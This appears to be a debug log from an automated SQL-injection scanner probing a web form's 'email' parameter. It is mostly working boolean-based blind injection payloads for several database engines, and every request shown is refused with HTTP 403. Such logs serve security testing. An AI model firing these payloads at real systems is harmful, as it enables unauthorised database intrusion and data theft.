+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP HANA OR time-based blind (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP HANA AND time-based blind (heavy query - comment)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'SAP HANA time-based blind - Parameter replace (heavy query)' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because user specified testing of only boolean-based blind techniques
+[08:21:13] [WARNING] POST parameter '_token' does not seem to be injectable
+[08:21:13] [WARNING] POST parameter 'email' does not appear to be dynamic
+[08:21:13] [PAYLOAD] @EMAIL@' ().,.",'(.-- -
+[08:21:14] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:14] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be SQL injectable
+[08:21:14] [PAYLOAD] @EMAIL@' 'ggvXAD<'">)dcBhyT-- -
+[08:21:15] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:16] [INFO] testing for SQL injection on POST parameter 'email'
+[08:21:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:21:16] [PAYLOAD] @EMAIL@'  AND 2917=2223-- -
+[08:21:17] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:17] [PAYLOAD] @EMAIL@'  AND 4019=4019-- -
+[08:21:18] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[08:21:18] [PAYLOAD] -9016'  OR 7158=3564-- -
+[08:21:19] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:19] [PAYLOAD] -2868'  OR 7056=7056-- -
+[08:21:20] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[08:21:20] [PAYLOAD] @EMAIL@'  OR NOT 7820=6486-- -
+[08:21:21] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:21] [PAYLOAD] @EMAIL@'  OR NOT 3988=3988-- -
+[08:21:22] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:21:22] [PAYLOAD] @EMAIL@'  AND 6525=(SELECT (CASE WHEN (6525=4878) THEN 6525 ELSE (SELECT 4878 UNION SELECT 1089) END))-- -
+[08:21:23] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:23] [PAYLOAD] @EMAIL@'  AND 6322=(SELECT (CASE WHEN (6322=6322) THEN 6322 ELSE (SELECT 4603 UNION SELECT 2784) END))-- -
+[08:21:24] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[08:21:24] [PAYLOAD] -8264'  OR 8259=(SELECT (CASE WHEN (8259=7824) THEN 8259 ELSE (SELECT 7824 UNION SELECT 4747) END))-- -
+[08:21:25] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:25] [PAYLOAD] -6984'  OR 1522=(SELECT (CASE WHEN (1522=1522) THEN 1522 ELSE (SELECT 9626 UNION SELECT 3440) END))-- -
+[08:21:26] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[08:21:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[08:21:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[08:21:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:21:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[08:21:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[08:21:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:21:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[08:21:26] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[08:21:26] [PAYLOAD] @EMAIL@'  RLIKE (SELECT (CASE WHEN (8647=8956) THEN 0x40454d41494c40 ELSE 0x28 END))-- -
+[08:21:27] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:27] [PAYLOAD] @EMAIL@'  RLIKE (SELECT (CASE WHEN (5123=5123) THEN 0x40454d41494c40 ELSE 0x28 END))-- -
+[08:21:29] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:29] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:21:29] [PAYLOAD] @EMAIL@'  AND MAKE_SET(6306=6869,6869)-- -
+[08:21:30] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:30] [PAYLOAD] @EMAIL@'  AND MAKE_SET(8541=8541,3577)-- -
+[08:21:31] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:31] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[08:21:31] [PAYLOAD] -5358'  OR MAKE_SET(1886=7333,7333)-- -
+[08:21:32] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:32] [PAYLOAD] -2818'  OR MAKE_SET(6567=6567,7054)-- -
+[08:21:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:33] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:21:33] [PAYLOAD] @EMAIL@'  AND ELT(6795=1929,1929)-- -
+[08:21:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:34] [PAYLOAD] @EMAIL@'  AND ELT(2952=2952,6516)-- -
+[08:21:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[08:21:35] [PAYLOAD] -2314'  OR ELT(1866=1924,1924)-- -
+[08:21:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:36] [PAYLOAD] -4755'  OR ELT(4215=4215,1571)-- -
+[08:21:37] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:37] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:21:37] [PAYLOAD] @EMAIL@'  AND EXTRACTVALUE(8732,CASE WHEN (8732=2927) THEN 8732 ELSE 0x3A END)-- -
+[08:21:38] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:38] [PAYLOAD] @EMAIL@'  AND EXTRACTVALUE(7028,CASE WHEN (7028=7028) THEN 7028 ELSE 0x3A END)-- -
+[08:21:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[08:21:39] [PAYLOAD] -7571'  OR EXTRACTVALUE(4824,CASE WHEN (4824=7426) THEN 4824 ELSE 0x3A END)-- -
+[08:21:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:40] [PAYLOAD] -1052'  OR EXTRACTVALUE(1282,CASE WHEN (1282=1282) THEN 1282 ELSE 0x3A END)-- -
+[08:21:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:42] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:21:42] [PAYLOAD] @EMAIL@'  AND (SELECT (CASE WHEN (7959=4470) THEN NULL ELSE CAST((CHR(65)||CHR(109)||CHR(118)||CHR(98)) AS NUMERIC) END)) IS NULL-- -
+[08:21:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:43] [PAYLOAD] @EMAIL@'  AND (SELECT (CASE WHEN (3491=3491) THEN NULL ELSE CAST((CHR(79)||CHR(114)||CHR(76)||CHR(67)) AS NUMERIC) END)) IS NULL-- -
+[08:21:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:44] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
+[08:21:44] [PAYLOAD] -3936'  OR (SELECT (CASE WHEN (6581=8256) THEN NULL ELSE CAST((CHR(99)||CHR(120)||CHR(121)||CHR(65)) AS NUMERIC) END)) IS NULL-- -
+[08:21:45] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:45] [PAYLOAD] -7998'  OR (SELECT (CASE WHEN (9307=9307) THEN NULL ELSE CAST((CHR(68)||CHR(100)||CHR(74)||CHR(87)) AS NUMERIC) END)) IS NULL-- -
+[08:21:46] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:46] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:21:46] [PAYLOAD] @EMAIL@'  AND (SELECT (CASE WHEN (9983=9788) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9983) END) FROM DUAL) IS NULL-- -
+[08:21:47] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:47] [PAYLOAD] @EMAIL@'  AND (SELECT (CASE WHEN (5440=5440) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5440) END) FROM DUAL) IS NULL-- -
+[08:21:48] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:48] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[08:21:48] [PAYLOAD] -6519'  OR (SELECT (CASE WHEN (7031=8278) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7031) END) FROM DUAL) IS NULL-- -
+[08:21:49] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:49] [PAYLOAD] -9508'  OR (SELECT (CASE WHEN (5655=5655) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5655) END) FROM DUAL) IS NULL-- -
+[08:21:50] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:50] [INFO] testing 'SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:21:50] [PAYLOAD] @EMAIL@'  AND CASE WHEN 9944=5838 THEN 9944 ELSE JSON(CHAR(102,88,118,116)) END-- -
+[08:21:51] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:51] [PAYLOAD] @EMAIL@'  AND CASE WHEN 9117=9117 THEN 9117 ELSE JSON(CHAR(117,97,106,120)) END-- -
+[08:21:52] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:52] [INFO] testing 'SQLite OR boolean-based blind - WHERE or HAVING clause (JSON)'
+[08:21:52] [PAYLOAD] -6317'  OR CASE WHEN 3700=7867 THEN 3700 ELSE JSON(CHAR(65,70,67,105)) END-- -
+[08:21:53] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:53] [PAYLOAD] -4599'  OR CASE WHEN 7174=7174 THEN 7174 ELSE JSON(CHAR(101,89,78,90)) END-- -
+[08:21:55] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[08:21:55] [PAYLOAD] '  (SELECT (CASE WHEN (8110=9257) THEN '@EMAIL@' ELSE (SELECT 9257 UNION SELECT 9821) END))-- -
+[08:21:56] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:56] [PAYLOAD] '  (SELECT (CASE WHEN (9575=9575) THEN '@EMAIL@' ELSE (SELECT 1390 UNION SELECT 6654) END))-- -
+[08:21:57] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
+[08:21:57] [PAYLOAD] '  MAKE_SET(1476=9879,9879)-- -
+[08:21:58] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:58] [PAYLOAD] '  MAKE_SET(2161=2161,5978)-- -
+[08:21:59] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:21:59] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[08:21:59] [PAYLOAD] '  MAKE_SET(7883=3632,0x40454d41494c40)-- -
+[08:22:00] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:00] [PAYLOAD] '  MAKE_SET(6172=6172,0x40454d41494c40)-- -
+[08:22:01] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:01] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
+[08:22:01] [PAYLOAD] '  ELT(5093=7660,7660)-- -
+[08:22:02] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:02] [PAYLOAD] '  ELT(8987=8987,3744)-- -
+[08:22:03] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:03] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
+[08:22:03] [PAYLOAD] '  ELT(6277=6743,0x40454d41494c40)-- -
+[08:22:04] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:04] [PAYLOAD] '  ELT(9631=9631,0x40454d41494c40)-- -
+[08:22:05] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
+[08:22:05] [PAYLOAD] '  (3736=6926)*6926-- -
+[08:22:07] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:07] [PAYLOAD] '  (4210=4210)*1912-- -
+[08:22:08] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
+[08:22:08] [PAYLOAD] '  (2658=1360)*0x40454d41494c40-- -
+[08:22:09] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:09] [PAYLOAD] '  (6165=6165)*0x40454d41494c40-- -
+[08:22:10] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
+[08:22:10] [PAYLOAD] '  (SELECT (CASE WHEN (3286=6865) THEN 3286 ELSE 1/(SELECT 0) END))-- -
+[08:22:11] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:11] [PAYLOAD] '  (SELECT (CASE WHEN (2035=2035) THEN 2035 ELSE 1/(SELECT 0) END))-- -
+[08:22:12] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:12] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
+[08:22:12] [PAYLOAD] '  (SELECT (CASE WHEN (4564=1035) THEN (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) ELSE 1/(SELECT 0) END))-- -
+[08:22:13] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:13] [PAYLOAD] '  (SELECT (CASE WHEN (5558=5558) THEN (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) ELSE 1/(SELECT 0) END))-- -
+[08:22:14] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:14] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
+[08:22:14] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(1193,1193,CASE WHEN (1193=1883) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:22:15] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:15] [PAYLOAD] '  (SELECT * FROM GENERATE_SERIES(6669,6669,CASE WHEN (6669=6669) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:22:16] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:16] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[08:22:16] [PAYLOAD] '  (SELECT (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) FROM GENERATE_SERIES(2440,2440,CASE WHEN (2440=2472) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:22:17] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:17] [PAYLOAD] '  (SELECT (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) FROM GENERATE_SERIES(2957,2957,CASE WHEN (2957=2957) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:22:18] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:18] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[08:22:18] [PAYLOAD] '  (SELECT (CASE WHEN (8712=7950) THEN 8712 ELSE 8712*(SELECT 8712 UNION ALL SELECT 7950) END))-- -
+[08:22:20] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:20] [PAYLOAD] '  (SELECT (CASE WHEN (7474=7474) THEN 7474 ELSE 7474*(SELECT 7474 UNION ALL SELECT 3320) END))-- -
+[08:22:21] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:21] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
+[08:22:21] [PAYLOAD] '  (SELECT (CASE WHEN (7081=8365) THEN CHAR(64)+CHAR(69)+CHAR(77)+CHAR(65)+CHAR(73)+CHAR(76)+CHAR(64) ELSE 7081*(SELECT 7081 UNION ALL SELECT 8365) END))-- -
+[08:22:22] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:22] [PAYLOAD] '  (SELECT (CASE WHEN (6689=6689) THEN CHAR(64)+CHAR(69)+CHAR(77)+CHAR(65)+CHAR(73)+CHAR(76)+CHAR(64) ELSE 6689*(SELECT 6689 UNION ALL SELECT 4099) END))-- -
+[08:22:23] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:23] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[08:22:23] [PAYLOAD] '  (SELECT (CASE WHEN (9971=4348) THEN 9971 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:22:24] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:24] [PAYLOAD] '  (SELECT (CASE WHEN (8526=8526) THEN 8526 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:22:25] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:25] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
+[08:22:25] [PAYLOAD] '  (SELECT (CASE WHEN (3431=6730) THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:22:26] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:26] [PAYLOAD] '  (SELECT (CASE WHEN (6879=6879) THEN CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:22:27] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:27] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[08:22:27] [PAYLOAD] '  (SELECT (CASE WHEN (7264=6847) THEN 7264 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:22:28] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:28] [PAYLOAD] '  (SELECT (CASE WHEN (6358=6358) THEN 6358 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:22:29] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:29] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
+[08:22:29] [PAYLOAD] '  (SELECT (CASE WHEN (6797=4656) THEN '@EMAIL@' ELSE 6797 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:22:30] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:30] [PAYLOAD] '  (SELECT (CASE WHEN (4392=4392) THEN '@EMAIL@' ELSE 4392 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:22:31] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:31] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[08:22:31] [PAYLOAD] '  IIF(7151=8141,7151,1/0)-- -
+[08:22:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:33] [PAYLOAD] '  IIF(5513=5513,5513,1/0)-- -
+[08:22:34] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:34] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
+[08:22:34] [PAYLOAD] '  IIF(4128=3138,CHR(64)&CHR(69)&CHR(77)&CHR(65)&CHR(73)&CHR(76)&CHR(64),1/0)-- -
+[08:22:35] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:35] [PAYLOAD] '  IIF(2222=2222,CHR(64)&CHR(69)&CHR(77)&CHR(65)&CHR(73)&CHR(76)&CHR(64),1/0)-- -
+[08:22:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:36] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[08:22:36] [PAYLOAD] '  (CASE WHEN (1079=8049) THEN 1079 ELSE 1079*(SELECT 1079 FROM DUAL UNION SELECT 8049 FROM DUAL) END)-- -
+[08:22:37] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:37] [PAYLOAD] '  (CASE WHEN (6063=6063) THEN 6063 ELSE 6063*(SELECT 6063 FROM DUAL UNION SELECT 1057 FROM DUAL) END)-- -
+[08:22:38] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[08:22:38] [PAYLOAD] '  (CASE WHEN (1704=9445) THEN '@EMAIL@' ELSE 1704*(SELECT 1704 FROM DUAL UNION SELECT 9445 FROM DUAL) END)-- -
+[08:22:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:39] [PAYLOAD] '  (CASE WHEN (4587=4587) THEN '@EMAIL@' ELSE 4587*(SELECT 4587 FROM DUAL UNION SELECT 7717 FROM DUAL) END)-- -
+[08:22:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[08:22:40] [PAYLOAD] '  (CASE WHEN 6662=1713 THEN 6662 ELSE NULL END)-- -
+[08:22:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:41] [PAYLOAD] '  (CASE WHEN 8670=8670 THEN 8670 ELSE NULL END)-- -
+[08:22:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[08:22:42] [PAYLOAD] '  (CASE WHEN 4963=4912 THEN '@EMAIL@' ELSE NULL END)-- -
+[08:22:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:43] [PAYLOAD] '  (CASE WHEN 6582=6582 THEN '@EMAIL@' ELSE NULL END)-- -
+[08:22:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:44] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:22:44] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (1983=4096) THEN 1 ELSE 1983*(SELECT 1983 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:22:46] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:46] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (2232=2232) THEN 1 ELSE 2232*(SELECT 2232 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:22:47] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:47] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:22:47] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (7430=7318) THEN 0x40454d41494c40 ELSE 7430*(SELECT 7430 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:22:48] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:48] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (8302=8302) THEN 0x40454d41494c40 ELSE 8302*(SELECT 8302 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:22:49] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:49] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[08:22:49] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (9609=4665) THEN 1 ELSE 1/(SELECT 0) END))-- -
+[08:22:50] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:50] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (6653=6653) THEN 1 ELSE 1/(SELECT 0) END))-- -
+[08:22:51] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:51] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[08:22:51] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (3557=8094) THEN (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) ELSE 1/(SELECT 0) END))-- -
+[08:22:52] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:52] [PAYLOAD] @EMAIL@' ,(SELECT (CASE WHEN (1766=1766) THEN (CHR(64)||CHR(69)||CHR(77)||CHR(65)||CHR(73)||CHR(76)||CHR(64)) ELSE 1/(SELECT 0) END))-- -
+[08:22:53] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:53] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[08:22:53] [PAYLOAD] @EMAIL@' ,(SELECT * FROM GENERATE_SERIES(7237,7237,CASE WHEN (7237=8602) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:22:54] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:22:54] [PAYLOAD] @EMAIL@' ,(SELECT * FROM GENERATE_SERIES(6077,6077,CASE WHEN (6077=6077) THEN 1 ELSE 0 END) LIMIT 1)-- -
